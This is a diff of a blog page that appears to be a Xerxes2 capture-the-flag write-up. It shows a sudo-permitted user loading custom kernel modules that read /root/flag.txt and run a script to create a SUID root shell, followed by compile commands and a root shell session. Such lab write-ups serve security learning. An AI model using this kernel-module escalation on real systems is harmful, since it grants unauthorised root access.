+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>Korenchkin can load and remove kernel modules as root without a password. This could be interesting as I have no idea about how kernel modules work. I started off compiling and loading a simple Hello World module from <span class="o">[</span>TheGeekStuff<span class="o">](</span>http://www.thegeekstuff.com/2013/07/write-linux-kernel-module/<span class="o">)</span>. It worked ! But can I make a malicious kernel module - possibly one that can <span class="nb">read</span> /root/flag.txt ? Yup, and here<span class="err">&#39;</span>s the code to <span class="k">do</span> it.
+</span><span class='line'>
+</span><span class='line'><span class="o">[</span>c<span class="o">]</span>
+</span><span class='line'><span class="c">#include &lt;linux/module.h&gt;  // Needed by all modules</span>
+</span><span class='line'><span class="c">#include &lt;linux/kernel.h&gt;  // Needed for KERN_INFO</span>
+</span><span class='line'><span class="c">#include &lt;linux/fs.h&gt;      // Needed by filp</span>
+</span><span class='line'><span class="c">#include &lt;asm/uaccess.h&gt;   // Needed by segment descriptors</span>
+</span><span class='line'>
+</span><span class='line'>int init_module<span class="o">(</span>void<span class="o">)</span>
+</span><span class='line'><span class="o">{</span>
+</span><span class='line'>    // Create variables
+</span><span class='line'>    struct file *f<span class="p">;</span>
+</span><span class='line'>    char buf<span class="o">[</span>1024<span class="o">]</span><span class="p">;</span>
+</span><span class='line'>    mm_segment_t fs<span class="p">;</span>
+</span><span class='line'>    int i<span class="p">;</span>
+</span><span class='line'>    // Init the buffer with 0
+</span><span class='line'>    <span class="k">for</span><span class="o">(</span><span class="nv">i</span><span class="o">=</span>0<span class="p">;</span>i&lt;1024<span class="p">;</span>i++<span class="o">)</span>
+</span><span class='line'>        buf<span class="o">[</span>i<span class="o">]</span> <span class="o">=</span> 0<span class="p">;</span>
+</span><span class='line'>    // To see in /var/log/messages that the module is operating
+</span><span class='line'>    printk<span class="o">(</span>KERN_INFO <span class="s2">&quot;My module is loaded\n&quot;</span><span class="o">)</span><span class="p">;</span>
+</span><span class='line'>    // I am using Fedora and <span class="k">for</span> the <span class="nb">test </span>I have chosen following file
+</span><span class='line'>    // Obviously it is much smaller than the <span class="m">128</span> bytes, but hell with <span class="nv">it</span> <span class="o">=)</span>
+</span><span class='line'>    <span class="nv">f</span> <span class="o">=</span> filp_open<span class="o">(</span><span class="s2">&quot;/root/flag.txt&quot;</span>, O_RDONLY, 0<span class="o">)</span><span class="p">;</span>
+</span><span class='line'>    <span class="k">if</span><span class="o">(</span><span class="nv">f</span> <span class="o">==</span> NULL<span class="o">)</span>
+</span><span class='line'>        printk<span class="o">(</span>KERN_ALERT <span class="s2">&quot;filp_open error!!.\n&quot;</span><span class="o">)</span><span class="p">;</span>
+</span><span class='line'>    <span class="k">else</span><span class="o">{</span>
+</span><span class='line'>        // Get current segment descriptor
+</span><span class='line'>        <span class="nv">fs</span> <span class="o">=</span> get_fs<span class="o">()</span><span class="p">;</span>
+</span><span class='line'>        // Set segment descriptor associated to kernel space
+</span><span class='line'>        set_fs<span class="o">(</span>get_ds<span class="o">())</span><span class="p">;</span>
+</span><span class='line'>        // Read the file
+</span><span class='line'>        f-&gt;f_op-&gt;read<span class="o">(</span>f, buf, 1024, <span class="p">&amp;</span>f-&gt;f_pos<span class="o">)</span><span class="p">;</span>
+</span><span class='line'>        // Restore segment descriptor
+</span><span class='line'>        set_fs<span class="o">(</span>fs<span class="o">)</span><span class="p">;</span>
+</span><span class='line'>        // See what we <span class="nb">read </span>from file
+</span><span class='line'>        printk<span class="o">(</span>KERN_INFO <span class="s2">&quot;buf:%s\n&quot;</span>,buf<span class="o">)</span><span class="p">;</span>
+</span><span class='line'>    <span class="o">}</span>
+</span><span class='line'>    filp_close<span class="o">(</span>f,NULL<span class="o">)</span><span class="p">;</span>
+</span><span class='line'>    <span class="k">return</span> 0<span class="p">;</span>
+</span><span class='line'><span class="o">}</span>
+</span><span class='line'>
+</span><span class='line'>void cleanup_module<span class="o">(</span>void<span class="o">)</span>
+</span><span class='line'><span class="o">{</span>
+</span><span class='line'>    printk<span class="o">(</span>KERN_INFO <span class="s2">&quot;My module is unloaded\n&quot;</span><span class="o">)</span><span class="p">;</span>
+</span><span class='line'><span class="o">}</span>
+</span></code></pre></td></tr></table></div></figure>
 
-<p>[c]</p>
-
-<h1>include &lt;linux/module.h>  // Needed by all modules</h1>
-
-<h1>include &lt;linux/kernel.h>  // Needed for KERN_INFO</h1>
-
-<h1>include &lt;linux/fs.h>      // Needed by filp</h1>
-
-<h1>include &lt;asm/uaccess.h>   // Needed by segment descriptors</h1>
-
-<p>int init_module(void)
-{
-    // Create variables
-    struct file *f;
-    char buf[1024];
-    mm_segment_t fs;
-    int i;
-    // Init the buffer with 0
-    for(i=0;i&lt;1024;i++)
-        buf[i] = 0;
-    // To see in /var/log/messages that the module is operating
-    printk(KERN_INFO &ldquo;My module is loaded\n&rdquo;);
-    // I am using Fedora and for the test I have chosen following file
-    // Obviously it is much smaller than the 128 bytes, but hell with it =)
-    f = filp_open(&ldquo;/root/flag.txt&rdquo;, O_RDONLY, 0);
-    if(f == NULL)
-        printk(KERN_ALERT &ldquo;filp_open error!!.\n&rdquo;);
-    else{
-        // Get current segment descriptor
-        fs = get_fs();
-        // Set segment descriptor associated to kernel space
-        set_fs(get_ds());
-        // Read the file
-        f->f_op->read(f, buf, 1024, &amp;f->f_pos);
-        // Restore segment descriptor
-        set_fs(fs);
-        // See what we read from file
-        printk(KERN_INFO &ldquo;buf:%s\n&rdquo;,buf);
-    }
-    filp_close(f,NULL);
-    return 0;
-}</p>
-
-<p>void cleanup_module(void)
-{
-    printk(KERN_INFO &ldquo;My module is unloaded\n&rdquo;);
-}
-[/c]</p>
 
 <p>I realised I needed a Makefile as well, so I knocked one of those up quickly (nothing complicated)</p>
 
@@ -1395,13 +1753,16 @@ obj-m += flag.o</p>
     make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules</p>
 
 <p>clean:
-    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
-[/plain]</p>
+    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean</p>
 
-<p>With the source code and the Makefile, I then compiled the kernel module and loaded it</p>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>With the <span class="nb">source </span>code and the Makefile, I <span class="k">then</span> compiled the kernel module and loaded it
+</span></code></pre></td></tr></table></div></figure>
 
-<p>[plain gutter=&ldquo;false&rdquo;]
-korenchkin@xerxes2:~/kernel/kernel2/kernel3/kernel4$ make -C /lib/modules/$(uname -r)/build M=/home/korenchkin/kernel/kernel2/kernel3/kernel4 modules
+
+<p> bash</p>
+
+<p>korenchkin@xerxes2:~/kernel/kernel2/kernel3/kernel4$ make -C /lib/modules/$(uname -r)/build M=/home/korenchkin/kernel/kernel2/kernel3/kernel4 modules
 make: Entering directory <code>/usr/src/linux-headers-3.2.0-4-686-pae'
   CC [M]  /home/korenchkin/kernel/kernel2/kernel3/kernel4/flag2.o
 /home/korenchkin/kernel/kernel2/kernel3/kernel4/flag2.c: In function ‘init_module’:
@@ -1433,56 +1794,90 @@ korenchkin@xerxes2:~/kernel/kernel2/kernel3/kernel4$ dmesg | tail -20
 [113593.419627]     Ping me on #vulnhub for thoughts and comments!
 [113593.419627]
 [113593.419628]                       @barrebas, July 2014
-[113593.419628]
-[/plain]</p>
+[113593.419628]</p>
 
-<p>So, most people would go &ldquo;I GOT THE FLAG !&rdquo; and do a little dance. Probably along these lines</p>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>So, most people would go <span class="s2">&quot;I GOT THE FLAG !&quot;</span> and <span class="k">do</span> a little dance. Probably along these lines
+</span><span class='line'>
+</span><span class='line'>!<span class="o">[](</span>http://24.media.tumblr.com/d84096090e0740e9a0f9c91e94277f5a/tumblr_n411lwkMIO1qi4zmno1_500.gif<span class="o">)</span>
+</span><span class='line'>
+</span><span class='line'>But I wanted more - I actually wanted a root shell. I wonder <span class="k">if</span> I can run shell scripts with a kernel module. Hmm... google ? I was drawn to <span class="o">[</span>this article<span class="o">](</span>http://people.ee.ethz.ch/~arkeller/linux/kernel_user_space_howto.html<span class="o">)</span> which provided the following code
+</span><span class='line'>
+</span><span class='line'><span class="o">[</span>c<span class="o">]</span>
+</span><span class='line'><span class="c">#include &lt;linux/module.h&gt;</span>
+</span><span class='line'><span class="c">#include &lt;linux/kernel.h&gt;</span>
+</span><span class='line'><span class="c">#include &lt;linux/init.h&gt;</span>
+</span><span class='line'><span class="c">#include &lt;linux/proc_fs.h&gt;</span>
+</span><span class='line'><span class="c">#include &lt;asm/uaccess.h&gt;</span>
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>static int __init usermodehelper_example_init<span class="o">(</span>void<span class="o">)</span>
+</span><span class='line'><span class="o">{</span>
+</span><span class='line'>  int <span class="nv">ret</span> <span class="o">=</span> 0<span class="p">;</span>
+</span><span class='line'>  char *argv<span class="o">[]</span> <span class="o">=</span> <span class="o">{</span><span class="s2">&quot;/home/arkeller/eth/paper/code/callee&quot;</span>, <span class="s2">&quot;2&quot;</span>, NULL <span class="o">}</span><span class="p">;</span>
+</span><span class='line'>  char *envp<span class="o">[]</span> <span class="o">=</span> <span class="o">{</span><span class="s2">&quot;HOME=/&quot;</span>, <span class="s2">&quot;PATH=/sbin:/usr/sbin:/bin:/usr/bin&quot;</span>, NULL <span class="o">}</span><span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'>  printk<span class="o">(</span><span class="s2">&quot;usermodehelper: init\n&quot;</span><span class="o">)</span><span class="p">;</span>
+</span><span class='line'>  /* last parameter: <span class="m">1</span> -&gt; <span class="nb">wait </span><span class="k">until</span> execution has finished, <span class="m">0</span> go ahead without waiting*/
+</span><span class='line'>  /* returns <span class="m">0</span> <span class="k">if</span> usermode process was started successfully, errorvalue otherwise*/
+</span><span class='line'>  /* no possiblity to get <span class="k">return</span> value of usermode process*/
+</span><span class='line'>  <span class="nv">ret</span> <span class="o">=</span> call_usermodehelper<span class="o">(</span><span class="s2">&quot;/home/arkeller/eth/paper/code/callee&quot;</span>, argv, envp, UMH_WAIT_EXEC<span class="o">)</span><span class="p">;</span>
+</span><span class='line'>  <span class="k">if</span> <span class="o">(</span>ret !<span class="o">=</span> 0<span class="o">)</span>
+</span><span class='line'>      printk<span class="o">(</span><span class="s2">&quot;error in call to usermodehelper: %i\n&quot;</span>, ret<span class="o">)</span><span class="p">;</span>
+</span><span class='line'>  <span class="k">else</span>
+</span><span class='line'>      printk<span class="o">(</span><span class="s2">&quot;everything all right\n&quot;</span><span class="o">)</span><span class="p">;</span>
+</span><span class='line'>        <span class="k">return</span> 0<span class="p">;</span>
+</span><span class='line'><span class="o">}</span>
+</span><span class='line'>
+</span><span class='line'>static void __exit usermodehelper_example_exit<span class="o">(</span>void<span class="o">)</span>
+</span><span class='line'><span class="o">{</span>
+</span><span class='line'>  printk<span class="o">(</span><span class="s2">&quot;usermodehelper: exit\n&quot;</span><span class="o">)</span><span class="p">;</span>
+</span><span class='line'><span class="o">}</span>
+</span><span class='line'>
+</span><span class='line'>module_init<span class="o">(</span>usermodehelper_example_init<span class="o">)</span><span class="p">;</span>
+</span><span class='line'>module_exit<span class="o">(</span>usermodehelper_example_exit<span class="o">)</span><span class="p">;</span>
+</span><span class='line'>MODULE_LICENSE<span class="o">(</span><span class="s2">&quot;GPL&quot;</span><span class="o">)</span><span class="p">;</span>
+</span></code></pre></td></tr></table></div></figure>
 
-<p><img src="http://24.media.tumblr.com/d84096090e0740e9a0f9c91e94277f5a/tumblr_n411lwkMIO1qi4zmno1_500.gif" alt="" /></p>
-
-<p>But I wanted more - I actually wanted a root shell. I wonder if I can run shell scripts with a kernel module. Hmm&hellip; google ? I was drawn to <a href="http://people.ee.ethz.ch/~arkeller/linux/kernel_user_space_howto.html">this article</a> which provided the following code</p>
-
-<p>[c]</p>
-
-<h1>include &lt;linux/module.h></h1>
-
-<h1>include &lt;linux/kernel.h></h1>
-
-<h1>include &lt;linux/init.h></h1>
-
-<h1>include &lt;linux/proc_fs.h></h1>
-
-<h1>include &lt;asm/uaccess.h></h1>
-
-<p>static int __init usermodehelper_example_init(void)
-{
-    int ret = 0;
-    char <em>argv[] = {&ldquo;/home/arkeller/eth/paper/code/callee&rdquo;, &ldquo;2&rdquo;, NULL };
-    char </em>envp[] = {&ldquo;HOME=/&rdquo;, &ldquo;PATH=/sbin:/usr/sbin:/bin:/usr/bin&rdquo;, NULL };</p>
-
-<pre><code>printk("usermodehelper: init\n");
-/* last parameter: 1 -&gt; wait until execution has finished, 0 go ahead without waiting*/
-/* returns 0 if usermode process was started successfully, errorvalue otherwise*/
-/* no possiblity to get return value of usermode process*/
-ret = call_usermodehelper("/home/arkeller/eth/paper/code/callee", argv, envp, UMH_WAIT_EXEC);
-if (ret != 0)
-    printk("error in call to usermodehelper: %i\n", ret);
-else
-    printk("everything all right\n");
-    return 0;
-</code></pre>
-
-<p>}</p>
-
-<p>static void __exit usermodehelper_example_exit(void)
-{
-    printk(&ldquo;usermodehelper: exit\n&rdquo;);
-}</p>
-
-<p>module_init(usermodehelper_example_init);
-module_exit(usermodehelper_example_exit);
-MODULE_LICENSE(&ldquo;GPL&rdquo;);
-[/c]</p>
 
 <p>I&rsquo;m on the home straight here - lets modify this code to run a shell script instead (the shell script used is identical to that used earlier to get from delacroix to polito).</p>
 
@@ -1525,12 +1920,16 @@ MODULE_LICENSE(&ldquo;GPL&rdquo;);
 
 <p>module_init(usermodehelper_example_init);
 module_exit(usermodehelper_example_exit);
-MODULE_LICENSE(&ldquo;GPL&rdquo;);[/c]</p>
+MODULE_LICENSE(&ldquo;GPL&rdquo;);</p>
 
-<p>I created another Makefile, compiled the module and loaded it</p>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>I created another Makefile, compiled the module and loaded it
+</span></code></pre></td></tr></table></div></figure>
 
-<p>[plain gutter=&ldquo;false&rdquo;]
-korenchkin@xerxes2:~$ make -C /lib/modules/$(uname -r)/build M=/home/korenchkin/a modules
+
+<p> bash</p>
+
+<p>korenchkin@xerxes2:~$ make -C /lib/modules/$(uname -r)/build M=/home/korenchkin/a modules
 make: Entering directory <code>/usr/src/linux-headers-3.2.0-4-686-pae'
   CC [M]  /home/korenchkin/a/a.o
   Building modules, stage 2.
@@ -1539,12 +1938,16 @@ make: Entering directory <code>/usr/src/linux-headers-3.2.0-4-686-pae'
   LD [M]  /home/korenchkin/a/a.ko
 make: Leaving directory</code>/usr/src/linux-headers-3.2.0-4-686-pae&#8217;
 korenchkin@xerxes2:~$ sudo insmod a.ko
-korenchkin@xerxes2:~$[/plain]</p>
+korenchkin@xerxes2:~$</p>
 
-<p><img src="http://media.giphy.com/media/DUuyU3KyYGLNS/giphy.gif" alt="" /></p>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>!<span class="o">[](</span>http://media.giphy.com/media/DUuyU3KyYGLNS/giphy.gif<span class="o">)</span>
+</span></code></pre></td></tr></table></div></figure>
 
-<p>[plain gutter=&ldquo;false&rdquo;]
-korenchkin@xerxes2:~$ ls -l /tmp
+
+<p> bash</p>
+
+<p>korenchkin@xerxes2:~$ ls -l /tmp
 total 244
 -rwxr-xr-x 1 delacroix delacroix    55 Aug  6 16:15 123.sh
 -rwsrwxrwx 1 root      root      97284 Aug  8 03:40 rootshell
@@ -1554,13 +1957,16 @@ korenchkin@xerxes2:~/a$ /tmp/rootshell</p>
 <h1>id</h1>
 
 <p>uid=1000(korenchkin) gid=1000(korenchkin) euid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(korenchkin)
-#
-[/plain]</p>
+#</p>
 
-<p>Well, what do you know - a binary owned by root with the SUID attribute set that drops us to a root shell. I&rsquo;ll echo my SSH key into authorized_keys for completeness, and SSH in as root and cat the /root/flag.txt file</p>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>Well, what <span class="k">do</span> you know - a binary owned by root with the SUID attribute <span class="nb">set </span>that drops us to a root shell. I<span class="err">&#39;</span>ll <span class="nb">echo </span>my SSH key into authorized_keys <span class="k">for</span> completeness, and SSH in as root and cat the /root/flag.txt file
+</span></code></pre></td></tr></table></div></figure>
 
-<p>[plain gutter=&ldquo;false&rdquo;]
-root@pwk:~# ssh <a href="&#x6d;&#x61;&#x69;&#108;&#x74;&#x6f;&#58;&#x72;&#111;&#111;&#116;&#64;&#49;&#x39;&#x32;&#46;&#49;&#x36;&#56;&#46;&#48;&#x2e;&#49;&#48;&#50;">&#114;&#x6f;&#111;&#x74;&#x40;&#49;&#57;&#50;&#x2e;&#49;&#x36;&#56;&#46;&#x30;&#46;&#49;&#x30;&#50;</a></p>
+
+<p> bash</p>
+
+<p>root@pwk:~# ssh <a href="&#x6d;&#97;&#x69;&#108;&#116;&#111;&#58;&#114;&#x6f;&#111;&#x74;&#64;&#x31;&#x39;&#x32;&#x2e;&#49;&#x36;&#x38;&#46;&#x30;&#x2e;&#49;&#x30;&#x32;">&#x72;&#x6f;&#111;&#116;&#x40;&#49;&#57;&#x32;&#x2e;&#49;&#x36;&#x38;&#46;&#48;&#x2e;&#x31;&#x30;&#x32;</a></p>
 
 <p>Welcome to xerxes2.
       XERXES wishes you
@@ -1603,8 +2009,9 @@ Ping me on #vulnhub for thoughts and comments!
                   @barrebas, July 2014
 </code></pre>
 
-<p>root@xerxes2:~#
-[/plain]</p>
+<p>root@xerxes2:~#</p>
+
+<p>&#8220;`</p>
 
 <p><img src="http://www.awesomelyluvvie.com/wp-content/uploads/2013/01/CharlieBrownDance2.gif" alt="" /></p>
 </div>
